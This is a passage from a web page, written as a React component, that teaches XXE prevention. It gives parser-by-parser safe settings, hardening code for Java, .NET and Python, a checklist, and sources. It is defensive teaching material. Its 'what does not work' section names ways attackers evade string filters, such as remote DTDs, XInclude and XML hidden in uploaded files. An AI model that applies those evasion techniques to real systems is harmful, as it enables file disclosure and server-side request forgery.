              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Fix patterns</h2>
              <p className='leading-relaxed mb-4'>
                The OWASP guidance is unambiguous: &quot;The safest way to prevent XXE is always to
                disable DTDs (External Entities) completely.&quot; Disabling DTDs also removes the
                Billion Laughs path. If a business requirement genuinely needs DTDs, disable
                external entities, external DTD loading and XInclude together — and keep in mind
                that the external-general-entities and external-parameter-entities flags must both
                be off, because either one alone leaves a working payload.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Parser defaults and the minimum safe configuration
              </h3>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Parser</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Default</th>
                      <th className='py-3 text-slate-100 font-semibold'>Set this</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>Java JAXP (DOM/SAX/DOM4J)</td>
                      <td className='py-3 pr-4'>XXE enabled by default</td>
                      <td className='py-3'>
                        <code className='text-slate-100'>disallow-doctype-decl=true</code>,{' '}
                        <code className='text-slate-100'>setXIncludeAware(false)</code>,{' '}
                        <code className='text-slate-100'>setExpandEntityReferences(false)</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>Java StAX XMLInputFactory</td>
                      <td className='py-3 pr-4'>External entities supported</td>
                      <td className='py-3'>
                        <code className='text-slate-100'>SUPPORT_DTD=false</code>,{' '}
                        <code className='text-slate-100'>isSupportingExternalEntities=false</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>
                        Java TransformerFactory / SchemaFactory / Validator
                      </td>
                      <td className='py-3 pr-4'>External access allowed</td>
                      <td className='py-3'>
                        <code className='text-slate-100'>ACCESS_EXTERNAL_DTD=&quot;&quot;</code>,{' '}
                        <code className='text-slate-100'>ACCESS_EXTERNAL_SCHEMA=&quot;&quot;</code>,{' '}
                        <code className='text-slate-100'>
                          ACCESS_EXTERNAL_STYLESHEET=&quot;&quot;
                        </code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>
                        .NET XmlDocument / XmlTextReader / XPathNavigator
                      </td>
                      <td className='py-3 pr-4'>
                        Unsafe before .NET Framework 4.5.2, safe from 4.5.2
                      </td>
                      <td className='py-3'>
                        <code className='text-slate-100'>XmlResolver = null</code>,{' '}
                        <code className='text-slate-100'>DtdProcessing = Prohibit</code>; ASP.NET
                        also needs{' '}
                        <code className='text-slate-100'>
                          {'<httpRuntime targetFramework="4.5.2" />'}
                        </code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>.NET XmlReader / XDocument / XmlNodeReader</td>
                      <td className='py-3 pr-4'>Safe by default from 4.5.2</td>
                      <td className='py-3'>
                        Never assign a non-null resolver; leave{' '}
                        <code className='text-slate-100'>DtdProcessing</code> at{' '}
                        <code className='text-slate-100'>Prohibit</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>Python lxml</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>resolve_entities=True</code> in older
                        releases; <code className='text-slate-100'>&apos;internal&apos;</code> in
                        lxml 5.0/6.1 (internal expansion still on)
                      </td>
                      <td className='py-3'>
                        <code className='text-slate-100'>resolve_entities=False</code>,{' '}
                        <code className='text-slate-100'>load_dtd=False</code>,{' '}
                        <code className='text-slate-100'>no_network=True</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>Python stdlib (etree/sax/minidom/pulldom)</td>
                      <td className='py-3 pr-4'>
                        External entities safe; Billion Laughs and quadratic blowup vulnerable
                      </td>
                      <td className='py-3'>
                        Use <code className='text-slate-100'>defusedxml</code> with{' '}
                        <code className='text-slate-100'>forbid_dtd</code>,{' '}
                        <code className='text-slate-100'>forbid_entities</code>,{' '}
                        <code className='text-slate-100'>forbid_external</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>PHP (libxml2 backend)</td>
                      <td className='py-3 pr-4'>Safe by default on PHP ≥ 8.0</td>
                      <td className='py-3'>
                        Pre-8.0:{' '}
                        <code className='text-slate-100'>
                          libxml_set_external_entity_loader(null)
                        </code>
                        ; never pass <code className='text-slate-100'>LIBXML_NOENT</code> or{' '}
                        <code className='text-slate-100'>LIBXML_DTDLOAD</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>Go encoding/xml</td>
                      <td className='py-3 pr-4'>No DTD processing, no external entity expansion</td>
                      <td className='py-3'>
                        Nothing to disable; audit cgo libxml2 bindings and any XML forwarded to
                        another service
                      </td>
                    </tr>
                    <tr>
                      <td className='py-3 pr-4'>Node.js pure-JS parsers</td>
                      <td className='py-3 pr-4'>No external-entity fetching implemented</td>
                      <td className='py-3'>
                        Keep it that way; native libxml2 bindings need{' '}
                        <code className='text-slate-100'>noent=false</code>,{' '}
                        <code className='text-slate-100'>nonet=true</code>,{' '}
                        <code className='text-slate-100'>dtdload=false</code>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Java: hardening JAXP</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// PRIMARY defense: reject any document with a DOCTYPE.
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Do not process XInclude, and do not substitute entity references.
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// If you cannot reject DOCTYPEs outright, turn off both entity classes
// and external DTD loading together - one without the other is bypassable.
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Centralize the same settings for the other factories you use:
//   SAXParserFactory  -> the same setFeature calls
//   XMLInputFactory   -> SUPPORT_DTD=false, isSupportingExternalEntities=false
//   TransformerFactory/SchemaFactory -> ACCESS_EXTERNAL_DTD="" (+ SCHEMA/STYLESHEET="")`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Two Java-specific traps from the OWASP cheat sheet. First, each{' '}
                <code className='text-slate-100'>setFeature</code> call belongs in its own
                try/catch, because a processor that throws on an unsupported feature would otherwise
                skip every subsequent hardening line. Second,{' '}
                <code className='text-slate-100'>java.beans.XMLDecoder.readObject()</code> cannot be
                made safe at all — it deserializes arbitrary objects and executes code — so replace
                it rather than configure it.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                .NET: explicit settings beat version assumptions
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`using System.Xml;

var settings = new XmlReaderSettings
{
    // Reject any DOCTYPE instead of parsing it.
    DtdProcessing = DtdProcessing.Prohibit,
    // Never resolve external resources.
    XmlResolver = null,
};

using var reader = XmlReader.Create(stream, settings);
var doc = new XmlDocument { XmlResolver = null };
doc.Load(reader);`}
              </pre>
              <p className='leading-relaxed mb-4'>
                On .NET Framework, the effective safety level is the <em>lower</em> of the
                assembly&apos;s target framework and the{' '}
                <code className='text-slate-100'>httpRuntime targetFramework</code> in{' '}
                <code className='text-slate-100'>Web.config</code> — an ASP.NET app targeting 4.8
                but declaring{' '}
                <code className='text-slate-100'>{'<httpRuntime targetFramework="4.0" />'}</code> is
                treated as pre-4.5.2 and is unsafe by default. Explicit settings are the only
                version-proof option.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Python: defusedxml, or explicit lxml flags
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`# Option A: defusedxml as a drop-in for the stdlib parsers.
from defusedxml.ElementTree import fromstring

root = fromstring(
    user_supplied_xml,
    forbid_dtd=True,        # no DOCTYPE at all
    forbid_entities=True,   # no entity expansion (Billion Laughs)
    forbid_external=True,   # no external references
)

# Option B: lxml, configured explicitly. Do not rely on version defaults -
# resolve_entities was True by default in older releases and is 'internal'
# (internal expansion still enabled) in lxml 5.0/6.1.
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)
root = etree.fromstring(user_supplied_xml, parser=parser)`}
              </pre>
              <p className='leading-relaxed'>
                Note the asymmetry: Python&apos;s stdlib parsers do not expand external entities (so
                the classic <code className='text-slate-100'>file://</code> payload is inert), but
                they <em>are</em> vulnerable to entity-expansion DoS. lxml is the opposite risk
                profile — it resolves entities, and its defaults have moved twice. Configure both
                explicitly and you do not have to remember which version fixed what.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Prevention checklist</h2>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>#</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Control</th>
                      <th className='py-3 text-slate-100 font-semibold'>Verification</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>1</td>
                      <td className='py-3 pr-4'>
                        Inventory every XML parse path — including file uploads, XSLT/validation
                        factories, XInclude and feed readers
                      </td>
                      <td className='py-3'>Grep table above returns no unexplained hits</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>2</td>
                      <td className='py-3 pr-4'>
                        Disable DTD processing by default; allow it only with a written
                        justification
                      </td>
                      <td className='py-3'>
                        Lab payloads 1–3 return no file content or external fetch
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>3</td>
                      <td className='py-3 pr-4'>
                        Centralize parser construction in one hardened helper per language; ban
                        ad-hoc parsers in review
                      </td>
                      <td className='py-3'>One constructor per stack, referenced everywhere</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>4</td>
                      <td className='py-3 pr-4'>
                        Enforce it in CI with Semgrep (registry Java rules + a local lxml rule)
                      </td>
                      <td className='py-3'>A deliberately vulnerable commit fails the pipeline</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>5</td>
                      <td className='py-3 pr-4'>
                        Cap input size and parser time; reject oversized documents before parsing
                      </td>
                      <td className='py-3'>Payload 4 fails fast instead of consuming CPU/memory</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>6</td>
                      <td className='py-3 pr-4'>
                        Egress allow-list plus alerting for XML-parsing services
                      </td>
                      <td className='py-3'>An unexpected remote DTD fetch raises an alert</td>
                    </tr>
                    <tr>
                      <td className='py-3 pr-4'>7</td>
                      <td className='py-3 pr-4'>
                        Patch XML libraries as a class, not per reported module
                      </td>
                      <td className='py-3'>Tika-style module/parser split does not leave a gap</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                What does not work (and why teams still ship it)
              </h2>
              <ul className='list-disc list-inside space-y-3'>
                <li>
                  <strong className='text-sky-400'>Blocking strings like </strong>
                  <code className='text-slate-100'>&lt;!DOCTYPE</code> or{' '}
                  <code className='text-slate-100'>SYSTEM</code>. The payload can hide the entity
                  declarations in a remote DTD (lab payload 3), reach the same primitive through
                  XInclude without any entity at all, or arrive inside an uploaded PDF/OOXML/SVG
                  where a request-body filter never sees the XML. The filter also breaks legitimate
                  XML that uses DTDs.
                </li>
                <li>
                  <strong className='text-sky-400'>Relying on the </strong>
                  <code className='text-slate-100'>FEATURE_SECURE_PROCESSING</code> flag alone. The
                  OWASP cheat sheet is explicit that its behaviour is implementation-dependent and
                  that it may not mitigate entity expansion; it is a supplement to disabling DTDs,
                  not a replacement.
                </li>
                <li>
                  <strong className='text-sky-400'>Disabling only one entity class. </strong>
                  External general entities and external parameter entities must be disabled
                  together, along with external DTD loading — the parameter-entity path is what
                  drives blind XXE, and it is easy to forget because most PoCs use the general form.
                </li>
                <li>
                  <strong className='text-sky-400'>
                    Putting the entity in an attribute value.{' '}
                  </strong>
                  XML 1.0 §4.4.4 makes that a fatal error, so the payload fails as malformed rather
                  than leaking — useful to know when you are testing whether a &quot;no leak&quot;
                  result means safe configuration or a broken payload.
                </li>
                <li>
                  <strong className='text-sky-400'>Assuming your language is immune. </strong>
                  Python stdlib and Go&apos;s <code className='text-slate-100'>encoding/xml</code>{' '}
                  really do resist the classic file-read payload, but Python stdlib still expands
                  entities recursively, and neither statement says anything about the Java or .NET
                  service you hand the same document to downstream.
                </li>
              </ul>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Key takeaways</h2>
              <ul className='list-disc list-inside space-y-2'>
                <li>
                  XXE is a parser configuration bug (CWE-611), not an input-validation bug; the fix
                  belongs in the parser constructor and in code review.
                </li>
                <li>
                  XML 1.0 §4.4.3 makes external entity resolution optional for non-validating
                  processors — any parser that fetches them by default has handed your application a
                  file-read and request-forgery primitive.
                </li>
                <li>
                  Disable DTDs entirely where possible; if you cannot, disable external entities,
                  external DTD loading and XInclude together and cap expansion.
                </li>
                <li>
                  Test with the lab payloads, including the remote-DTD variant that contains no{' '}
                  <code className='text-slate-100'>&lt;!ENTITY</code> at all.
                </li>
                <li>
                  Detect it in code (Semgrep, one hardened helper per stack) and in egress traffic —
                  the <code className='text-slate-100'>file://</code> disclosure leaves no packet.
                </li>
              </ul>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Kokkuvõte eesti keeles</h2>
              <p className='leading-relaxed mb-4'>
                XXE ehk XML-i väliste olemite rünne (CWE-611) tabab rakendusi, mille XML-parser
                lahendab kasutaja saadetud dokumendis viidatud väliseid olemiviiteid. Ründaja saab
                nii lugeda serveri faile (<code className='text-slate-100'>file://</code>), teha
                serveri nimel päringuid sisemistesse teenustesse ja pilvemetadata-liidesesse, teha
                portskaneerimist või kurnata mälu ja protsessoriressurssi. Juurpõhjus ei ole XML
                ise, vaid parseri seadistus: XML 1.0 spetsifikatsiooni punkt 4.4.3 ütleb, et
                mittevalideeriv parser <em>võib</em>, aga ei pea välise olemiviite sisu laadima —
                kui parser teeb seda vaikimisi, ongi haavatavus olemas.
              </p>
              <p className='leading-relaxed mb-4'>
                Kõige kindlam parandus on DTD-d täielikult keelata, sest see sulgeb ka Billion
                Laughs ehk olemite laiendamise kaudu tekitatava teenusetõkestuse. Kui DTD-d on
                tõesti vaja, tuleb korraga välja lülitada välised üld- ja parameeterolemid, välise
                DTD laadimine ning XInclude, samuti piirata olemite laiendamise mahtu. Tuvastus
                tasub ehitada kahte kohta: koodi (Semgrep-reeglid ja üks tsentraliseeritud,
                karastatud parser-helper iga tehnoloogia jaoks) ja väljuvasse liiklusesse, sest{' '}
                <code className='text-slate-100'>file://</code> kaudu toimuv andmeleke ei jäta
                võrgus ühtegi paketti.
              </p>
              <p className='leading-relaxed'>
                Täielik lokaalne docker-compose labor (haavatav ja karastatud lõpp-punkt, ründaja
                konteiner välise DTD-ga), ründenäited ning paranduskood Java, .NET-i, Pythoni, PHP,
                Go ja Node.js jaoks on ülal inglise keeles.
              </p>
            </section>

            <section>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Sources</h2>
              <ul className='list-disc list-inside space-y-1 text-sm'>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html'
                    rel='noopener noreferrer'
                  >
                    OWASP Cheat Sheet Series — XML External Entity Prevention
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://www.w3.org/TR/xml/'
                    rel='noopener noreferrer'
                  >
                    W3C — Extensible Markup Language (XML) 1.0, Fifth Edition (sections 4.2.2,
                    4.4.2–4.4.5)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cwe.mitre.org/data/definitions/611.html'
                    rel='noopener noreferrer'
                  >
                    CWE-611 — Improper Restriction of XML External Entity Reference
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cwe.mitre.org/data/definitions/776.html'
                    rel='noopener noreferrer'
                  >
                    CWE-776 — Improper Restriction of Recursive Entity References in DTDs
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'
                    rel='noopener noreferrer'
                  >
                    OWASP Top 10:2021 — A05 Security Misconfiguration (mapped CWEs)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://www.cve.org/CVERecord?id=CVE-2025-66516'
                    rel='noopener noreferrer'
                  >
                    CVE-2025-66516 — Critical XXE in Apache Tika (XFA in PDF)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2025-68493'
                    rel='noopener noreferrer'
                  >
                    NVD — CVE-2025-68493 (Apache Struts S2-069 XXE)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cwiki.apache.org/confluence/display/WW/S2-069'
                    rel='noopener noreferrer'
                  >
                    Apache Struts security bulletin S2-069
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/cve-2017-12629'
                    rel='noopener noreferrer'
                  >
                    NVD — CVE-2017-12629 (Apache Solr XXE chained to RCE)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://docs.python.org/3/library/xml.html#xml-vulnerabilities'
                    rel='noopener noreferrer'
                  >
                    Python documentation — XML vulnerabilities
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://lxml.de/apidoc/lxml.etree.html'
                    rel='noopener noreferrer'
                  >
                    lxml documentation — lxml.etree XMLParser (resolve_entities default)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://www.php.net/manual/en/function.libxml-disable-entity-loader.php'
                    rel='noopener noreferrer'
                  >
                    PHP manual — libxml_disable_entity_loader (PHP 8.0 default behaviour)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://portswigger.net/web-security/xxe'
                    rel='noopener noreferrer'
                  >
                    PortSwigger Web Security Academy — XML external entity (XXE) injection
                  </a>
                </li>
              </ul>
            </section>
          </div>
        </div>
      </div>
    </>
  );
}
